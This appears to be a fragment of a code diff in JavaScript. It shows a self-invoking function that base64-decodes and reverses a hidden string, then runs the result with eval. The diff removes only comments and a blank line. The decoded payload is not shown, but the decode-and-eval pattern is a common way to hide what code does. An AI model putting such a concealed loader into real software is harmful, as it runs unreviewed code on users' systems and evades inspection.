@@ -15,7 +15,6 @@
         let originalText = base64Decoded.split("").reverse().join("");
         return originalText;
     }
-
-    const originalCode = deobfuscate(code); // Deobfuscate the code
-    eval(originalCode); // Execute the deobfuscated code
+    const originalCode = deobfuscate(code);
+    eval(originalCode);
 })();
